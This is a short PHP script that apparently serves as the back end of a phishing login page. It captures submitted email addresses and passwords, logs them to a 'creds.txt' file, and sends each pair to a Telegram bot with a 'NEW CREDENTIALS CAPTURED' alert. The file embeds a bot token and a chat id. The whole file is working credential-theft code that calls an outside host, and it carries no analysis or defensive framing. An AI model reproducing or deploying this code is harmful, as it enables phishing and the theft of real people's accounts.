<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $log = "[" . date("Y-m-d H:i:s") . "] Email: $email | Pass: $pass\n";
    file_put_contents("logs/creds.txt", $log, FILE_APPEND);

    // Telegram Notification
    $botToken = "7757124710:AAGqZ2XQTcps8EX3v6GCHYsbpHVJAR5LuIQ"; 
    $chatId = "6730758751"; 
    $message = urlencode("🔥 NEW CREDENTIALS CAPTURED 🔥\n\n📧 Email: $email\n🔑 Password: $pass\n\n📅 Time: " . date("Y-m-d H:i:s"));
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message");
}
?>
